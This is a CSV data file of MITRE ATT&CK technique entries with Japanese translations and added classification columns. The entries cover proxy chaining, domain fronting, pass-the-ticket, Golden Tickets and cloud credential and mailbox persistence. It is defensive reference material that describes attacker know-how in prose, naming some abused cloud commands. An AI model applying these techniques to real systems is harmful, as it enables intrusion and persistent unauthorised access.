T1090.003,T1090,Multi-hop Proxy,マルチホッププロキシ,"Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. For example, adversaries may construct or use onion routing networks  Esuch as the publicly available [Tor](https://attack.mitre.org/software/S0183) network  Eto transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing) Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.(Citation: ORB Mandiant) In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN). Protocols such as ICMP may be used as a transport. Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)",攻撃者は複数のプロキシを連鎖させて悪意のあるトラフィックの送信元を偽装することがある。防御側は通常、自ネットワークに入る直前の最終プロキシトラフィックを特定できるが、最終ホッププロキシ以前のプロキシを特定できるかどうかは場合による。この手法により、防御側は悪意のあるトラフィックの送信元を特定するために複数のプロキシを経由して追跡する必要が生じ、送信元の特定がさらに困難になる。 例えば、攻撃者は公開されている[Tor](https://attack.mitre.org/software/S0183)ネットワークのようなオニオンルーティングネットワークを構築または利用し、侵害された集団を経由して暗号化されたC2トラフィックを転送し、ネットワーク内の任意のデバイスとの通信を可能にする。(引用: Onion Routing) 攻撃者はまた、仮想プライベートサーバー(VPS)、モノのインターネット(IoT)デバイス、スマートデバイス、および寿命を迎えたルーターで構成される運用中継ボックス(ORB)ネットワークを使用して、自らの操作を難読化する場合がある。(引用: ORB Mandiant) ネットワークインフラの場合、敵対者は複数の侵害されたデバイスを活用して、マルチホッププロキシチェーン（すなわち、[ネットワークデバイス](https://attack.mitre.org/techniques/T1584/008)）を構築することが可能である。 ルーター上の[Patch System Image](https://attack.mitre.org/techniques/T1601/001)を活用することで、攻撃者は影響を受けたネットワークデバイスにカスタムコードを追加し、それらのノード間でオニオンルーティングを実装できます。 この手法は、攻撃者がインターネット境界の保護されたネットワーク境界を越え、組織の広域ネットワーク（WAN）に侵入することを可能にする[ネットワーク境界ブリッジング](https://attack.mitre.org/techniques/T1599)手法に依存している。ICMPなどのプロトコルがトランスポートとして使用される可能性がある。 同様に、攻撃者はピアツーピア（P2P）およびブロックチェーン指向のインフラを悪用し、分散型ピアネットワーク間でルーティングを実装する可能性がある。（引用元：NGLiteトロイの木馬）,command-and-control,Linux;Network Devices;Windows;macOS;ESXi,destructive_impact,remote_control,authentication_system;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d,2020-03-14T23:23:41.770Z,2025-04-15T19:58:56.270Z,,,,
T1090.004,T1090,Domain Fronting,ドメイン・フロンティング,"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored). For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",攻撃者は、コンテンツ配信ネットワーク（CDN）や複数ドメインをホストするサービスにおけるルーティング方式を悪用し、HTTPSトラフィックまたはHTTPS経由でトンネル化されたトラフィックの意図的な宛先を難読化することがある。（引用：Fifield Blocking Resistent Communication through domain fronting 2015）ドメイン・フロンティングでは、TLSヘッダーのSNIフィールドとHTTPヘッダーのHostフィールドに異なるドメイン名を使用する。 両ドメインが同一CDNから提供される場合、CDNはTLSヘッダーを展開後、HTTPヘッダーで指定されたアドレスへルーティングする可能性がある。この手法の変種である「ドメインレス」フロントングでは、SNIフィールドを空白のまま使用する。これにより、CDNがSNIとHTTP Hostフィールドの一致を検証しようとする場合でも（空白のSNIフィールドが無視されれば）、フロントングが機能する可能性がある。 例えば、domain-x と domain-y が同一CDNの顧客である場合、domain-x を TLS ヘッダーに、domain-y を HTTP ヘッダーに配置することが可能です。トラフィックは domain-x 宛てに見えるものの、CDN はそれを domain-y へルーティングする可能性があります。,command-and-control,Linux;macOS;Windows;ESXi,defense_disable,remote_control,network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2,2020-03-14T23:29:19.581Z,2025-04-25T14:48:02.492Z,,,,
T1091,,Replication Through Removable Media,リムーバブルメディアを介した複製,"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself. Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",攻撃者は、マルウェアをリムーバブルメディアにコピーし、メディアがシステムに挿入されて実行される際の自動実行機能を利用することで、システム（切断されたネットワークやエアギャップネットワーク上のシステムを含む）に侵入する可能性があります。横方向移動の場合、リムーバブルメディアに保存された実行可能ファイルの改変、またはマルウェアをコピーして正当なファイルのように見せかけるために名前を変更し、別のシステムでユーザーを騙して実行させることで発生する可能性があります。 初期アクセス時には、メディアの手動操作、メディア初期フォーマット用システムへの改変、メディアファームウェア自体の改変を通じて発生する可能性がある。モバイルデバイスもUSB接続時にPCへマルウェアを感染させる手段となり得る（引用: スマートフォンUSBの悪用）。この感染はデバイス（Android、iOS等）や、場合によってはUSB充電ケーブルを用いて達成される。(引用: Windows Malware Infecting Android)(引用: iPhone Charging Cable Hack) 例えば、スマートフォンがシステムに接続されると、USB接続のディスクドライブと同様にマウントされたように見える場合があります。接続されたシステムと互換性のあるマルウェアがモバイルデバイス上に存在する場合、そのマルウェアはマシンに感染する可能性があります（特に自動実行機能が有効な場合）。,lateral-movement;initial-access,Windows,remote_service_abuse,boundary_crossing,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S1,S1,C02;C01,Secondary Action;Initial Access,C01,Initial Access,TA0008;TA0001,attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4,2017-05-31T21:31:08.977Z,2025-04-15T19:58:24.231Z,,,,
T1092,,Communication Through Removable Media,リムーバブルメディアを介した通信,"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",攻撃者は、取り外し可能なメディアを使用してシステム間でコマンドを転送することで、潜在的に切断されたネットワーク上の侵害されたホスト間でコマンドと制御を実行できる。(引用元: ESET Sednit USBStealer 2014)両システムは侵害されている必要があり、インターネット接続システムが最初に侵害され、次に[リムーバブルメディアを介した複製](https://attack.mitre.org/techniques/T1091)による横方向の移動によって2台目が侵害される可能性が高い。 コマンドやファイルは、攻撃者が直接アクセスできるインターネット接続システムへ、切断されたシステムから中継される。,command-and-control,Linux;macOS;Windows,script_command_execution,remote_control,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef,2017-05-31T21:31:09.379Z,2025-04-15T22:06:39.028Z,,,,
T1093,,Process Hollowing,プロセスホローイング,"Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Elastic Process Injection July 2017)",プロセスホローイングは、プロセスがサスペンド状態で作成された後、そのメモリがアンマップされ、悪意のあるコードに置き換えられることで発生します。[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、悪意のあるコードの実行は正当なプロセスに隠蔽され、防御や検知分析を回避する可能性があります。 (引用: Leitch Hollowing) (引用: Elastic Process Injection July 2017),defense-evasion,Windows,other,stealth,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21,2017-05-31T21:31:09.815Z,2025-04-25T15:15:13.596Z,,,,
T1094,,Custom Command and Control Protocol,カスタムコマンド＆コントロールプロトコル,Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing [Application Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.,攻撃者は、既存の[アプリケーション層プロトコル](https://attack.mitre.org/techniques/T1071)でコマンド/データをカプセル化する代わりに、カスタムC&Cプロトコルを使用して通信する場合があります。実装例には、既知のプロトコルを模倣する方法や、TCP/IP/その他の標準ネットワークスタックが提供する基本プロトコル上にカスタムプロトコル（生ソケットを含む）を開発する方法があります。,command-and-control,Linux;macOS;Windows,script_command_execution,remote_control,endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--f72eb8a8-cd4c-461d-a814-3f862befbf00,2017-05-31T21:31:10.314Z,2025-04-25T15:16:23.937Z,,,,
T1095,,Non-Application Layer Protocol,非アプリケーション層プロトコル,"Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL). ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications. In ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)",攻撃者は、ホストとC2サーバー間、またはネットワーク内の感染ホスト間で通信するために、OSI非アプリケーション層プロトコルを使用する可能性がある。 利用可能なプロトコルのリストは広範である（出典: Wikipedia OSI）。具体的な例としては、ネットワーク層プロトコル（例：インターネット制御メッセージプロトコル（ICMP））、トランスポート層プロトコル（例：ユーザーデータグラムプロトコル（UDP））、セッション層プロトコル（例：ソケットセキュア（SOCKS））、およびリダイレクト/トンネリングされたプロトコル（例：シリアルオーバーLAN（SOL））の使用が挙げられる。 ホスト間のICMP通信はその一例である（引用元：Cisco Synful Knock Evolution）。ICMPはインターネットプロトコルスイートの一部であるため、すべてのIP互換ホストで実装が義務付けられている（引用元：Microsoft ICMP）。しかし、TCPやUDPなどの他のインターネットプロトコルほど監視が一般的ではなく、攻撃者が通信を隠蔽するために利用される可能性がある。 ESXi環境では、攻撃者はゲスト仮想マシンとESXiホスト間の通信に仮想マシン通信インターフェース（VMCI）を利用することがあります。このトラフィックは従来のネットワークソケット上のクライアント-サーバー通信に類似していますが、ESXiホストを実行する物理マシン内に限定され、外部ネットワーク（ルーター、スイッチ）を経由しません。 このため、外部監視やtcpdump、netstat、nmap、Wiresharkなどの標準的なネットワークツールでは検知できない通信が発生します。侵害されたESXiホストにVMCIバックドアを追加することで、攻撃者はネットワークセグメンテーションやファイアウォールルールに関係なく、任意のゲストVMから侵害されたESXiホストのバックドアへ永続的にアクセスを回復できます。（出典：Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023）,command-and-control,Windows;Linux;macOS;Network Devices;ESXi,credential_abuse,remote_control,authentication_system;user_interaction;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b,2017-05-31T21:31:10.728Z,2025-04-15T19:59:04.779Z,,,,
T1096,,NTFS File Attributes,NTFSファイル属性,"Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014) Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",すべてのNTFS（New Technology File System）フォーマットパーティションには、パーティション上のすべてのファイル/ディレクトリの記録を保持するマスターファイルテーブル（MFT）が含まれます。 (引用元: SpectorOps Host-Based Jul 2017) MFTエントリ内には、拡張属性(EA)やデータ属性（複数のデータ属性が存在する場合、代替データストリーム(ADS)として知られる）などのファイル属性(引用元: Microsoft NTFS File Attributes Aug 2010)が含まれており、任意のデータ（さらには完全なファイル）を保存するために使用できます。 (引用元: SpectorOps Host-Based Jul 2017) (引用元: Microsoft File Streams) (引用元: MalwareBytes ADS July 2015) (引用元: Microsoft ADS Mar 2014) 攻撃者は、ファイル属性メタデータに悪意のあるデータやバイナリを直接ファイル内に保存する代わりに格納することがあります。 これは、静的インジケータスキャンツールやアンチウイルスなどの防御を回避するために行われる可能性があります。(引用: Journey into IR ZeroAccess NTFS EA) (引用: MalwareBytes ADS July 2015),defense-evasion,Windows,discovery_enumeration,stealth,file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--f2d44246-91f1-478a-b6c8-1227e0ca109d,2017-05-31T21:31:11.147Z,2025-04-25T15:16:22.196Z,,,,
T1097,,Pass the Ticket,チケットのパス,"Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system. In this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket) Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks) Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)",チケットのパス (PtT) は、アカウントのパスワードにアクセスすることなく、Kerberos チケットを使用してシステムに認証する手法です。Kerberos 認証は、リモートシステムへの横移動の最初のステップとして使用できます。 この手法では、[有効なアカウント](https://attack.mitre.org/techniques/T1078) に対する有効な Kerberos チケットを、[OS 認証情報ダンプ](https://attack.mitre.org/techniques/T1003) によって取得する。 ユーザーのサービスチケットまたはチケットグラントチケット（TGT）は、アクセス権限レベルに応じて取得可能です。サービスチケットは特定リソースへのアクセスを許可しますが、TGTはチケットグラントサービス（TGS）からサービスチケットを要求するために使用でき、ユーザーがアクセス権限を持つあらゆるリソースへのアクセスを可能にします。 (引用元: ADSecurity AD Kerberos Attacks) (引用元: GentilKiwi Pass the Ticket) 認証メカニズムとしてKerberosを使用するサービスに対しては、シルバーチケットを取得可能です。これは特定のリソースおよびそのリソースをホストするシステム（例: SharePoint）へのアクセスチケットを生成するために使用されます。 (引用元：ADSecurity AD Kerberos Attacks)ゴールデンチケットは、キー配布サービスアカウント KRBTGT アカウント NTLM ハッシュを使用してドメインに対して取得することができ、Active Directory 内のあらゆるアカウントの TGT を生成することが可能になります。(引用元：キャンベル 2014),lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;user_interaction;network_connectivity;file_storage_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--a257ed11-ff3b-4216-8c9d-3938ef57064c,2017-05-31T21:31:11.623Z,2025-04-25T15:15:56.980Z,,,,
T1098,,Account Manipulation,アカウント操作,"Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",敵対者は、被害者のシステムへのアクセスを維持および/または昇格させるために、アカウントを操作する場合があります。アカウント操作とは、認証情報や権限グループの変更など、侵害されたアカウントへの敵対者のアクセスを維持または変更するあらゆる行動を指します（引用元：FireEye SMOKEDHAM 2021年6月）。また、パスワードの有効期間ポリシーを迂回して侵害された認証情報の有効期間を維持するために、パスワードの更新を繰り返し行うなど、セキュリティポリシーを破壊することを目的としたアカウントの活動も、この行動に含まれる場合があります。 アカウントの作成または操作を行うには、攻撃者はシステムまたはドメイン上で十分な権限を既に保有している必要がある。ただし、アカウント操作は権限昇格につながる可能性もあり、変更によって追加の役割、権限、またはより高い特権を持つ[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスが付与される場合がある。,persistence;privilege-escalation,Windows;IaaS;Linux;macOS;SaaS;Network Devices;Containers;Office Suite;Identity Provider;ESXi,credential_abuse,privilege_gain,authentication_system;privileged_account;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27,2017-05-31T21:31:12.196Z,2025-04-15T19:58:54.718Z,,,,
T1098.001,T1098,Additional Cloud Credentials,追加のクラウド認証情報,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment. For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals) In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes) Adversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation: Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024) If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated. (Citation: Crowdstrike AWS User Federation Persistence) In Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account.(Citation: Mandiant APT42 Operations 2024) As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user’s primary password is reset.(Citation: Microsoft Entra ID App Passwords)",攻撃者は、環境内の被害者アカウントやインスタンスへの持続的なアクセスを維持するため、クラウドアカウントに攻撃者管理の認証情報を追加する場合があります。 例えば、攻撃者は Azure / Entra ID 内の既存の正当な認証情報に加えて、サービスプリンシパルおよびアプリケーション用の認証情報を追加することがあります。(引用: Microsoft SolarWinds カスタマーガイダンス)(引用: Blue Cloud of Death)(引用: Blue Cloud of Death ビデオ) これらの認証情報には x509 キーとパスワードの両方が含まれます。(引用: Microsoft SolarWinds カスタマーガイダンス) 十分な権限があれば、Azure Portal、Azureコマンドラインインターフェース、AzureまたはAz PowerShellモジュールなど、さまざまな方法で資格情報を追加できます。（引用元：Demystifying Azure AD Service Principals）インフラストラクチャ・アズ・ア・サービス（IaaS）環境では、[クラウドアカウント](https://attack.mitre.org/techniques/T1078/004)を介してアクセス権を取得した後、 攻撃者はAWSの<code>CreateKeyPair</code>または<code>ImportKeyPair</code> API、あるいはGCPの<code>gcloud compute os-login ssh-keys add</code>コマンドを使用して独自のSSHキーを生成またはインポートする可能性があります。(引用元: GCP SSH Key Add) これにより、侵害されたクラウドアカウントをさらに使用することなく、クラウド環境内のインスタンスへの永続的なアクセスが可能になります。(引用元: Expel IO Evil in AWS)(引用元: Expel Behind the Scenes) 攻撃者はまた、AWS の <code>CreateAccessKey</code> API または GCP の <code>gcloud iam service-accounts keys create</code> コマンドを使用して、アカウントにアクセスキーを追加する可能性があります。 あるいは、AWS の <code>CreateLoginProfile</code> API を使用して、[Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) の AWS Management Console にログインできるパスワードを追加する場合もあります。(引用: Permiso Scattered Spider 2023)(引用: Lacework AI Resource Hijacking 2024) 対象アカウントの権限が要求元アカウントと異なる場合、攻撃者は環境内での権限昇格も可能となる（例: [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)）。(引用: Rhino Security Labs AWS Privilege Escalation)(引用: Sysdig ScarletEel 2.0) 例えばEntra ID環境では、アプリケーション管理者ロールを持つ攻撃者は、アプリケーションのサービスプリンシパルに新たな認証情報を追加できる。これにより攻撃者はサービスプリンシパルのロールと権限にアクセス可能となり、これらはアプリケーション管理者の権限とは異なる場合がある。(引用元: SpecterOps Azure Privilege Escalation) AWS環境では、適切な権限を持つ攻撃者は`sts:GetFederationToken` API呼び出しを使用して、元のユーザーアカウントの権限に紐付いた一時的な認証情報セットを作成し、[Web認証情報の偽造](https://attack.mitre.org/techniques/T1606)を行うことも可能です。 これらの仮の認証情報は、元のアカウントの API 認証情報が無効化されても、有効期間中は有効なままとなる可能性があります。(引用元: Crowdstrike AWS User Federation Persistence) アプリパスワード機能が有効化された Entra ID 環境では、攻撃者がユーザーアカウントにアプリパスワードを追加できる可能性があります。（引用元：Mandiant APT42 Operations 2024）アプリパスワードは多要素認証（MFA）をサポートしないレガシーデバイスでの使用を目的としているため、アプリパスワードを追加することで攻撃者はMFA要件を回避できる可能性があります。さらに、ユーザーのプライマリパスワードがリセットされても、アプリパスワードは有効なまま残る場合があります。（引用元：Microsoft Entra ID App Passwords）,persistence;privilege-escalation,IaaS;SaaS;Identity Provider,credential_abuse,privilege_gain,authentication_system;mfa_in_use;identity_federation;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd,2020-01-19T16:10:15.008Z,2025-04-15T21:45:50.674Z,,,,
T1098.002,T1098,Additional Email Delegate Permissions,追加のメール委任権限,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. For example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Mandiant Defend UNC2452 White Paper) This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)","攻撃者は、攻撃者が制御するメールアカウントへの永続的なアクセスを維持するために、追加の権限レベルを付与する場合があります。例えば、オンプレミス版ExchangeおよびクラウドベースのサービスOffice 365で利用可能な<code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドレットは、メールボックスへの権限を追加します。(引用元: Microsoft - Add-MailboxPermission)(引用元: FireEye APT35 2018)(引用元: Crowdstrike Hiding in Plain Sight 2018) Google Workspaceでは、Google管理コンソール経由で委任を有効化でき、ユーザーはGmail設定からアカウントを委任できます。(引用元: Gmail Delegation)(引用元: Google Ensuring Your Information is Safe) 攻撃者は個別のフォルダ権限やロールを通じてメールボックスフォルダの権限を割り当てることも可能です。Office 365環境では、攻撃者が情報ストアのルート（Top of Information Store）、受信トレイ、その他のメールボックスフォルダに対して「デフォルトユーザー」または「匿名ユーザー」の権限やロールを割り当てる場合があります。フォルダにいずれか一方または両方のユーザー権限を割り当てることで、攻撃者はテナント内の他の任意のアカウントを利用して、標的ユーザーのメールフォルダへの持続的アクセスを維持できます。(引用元: Mandiant Defend UNC2452 ホワイトペーパー) これは持続的脅威インシデントやBEC（ビジネスメール詐欺）インシデントで利用される可能性があり、攻撃者は侵害対象アカウントに[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を付与できます。これによりシステムへのアクセス獲得に向けた追加手法の使用が可能になる場合があります。 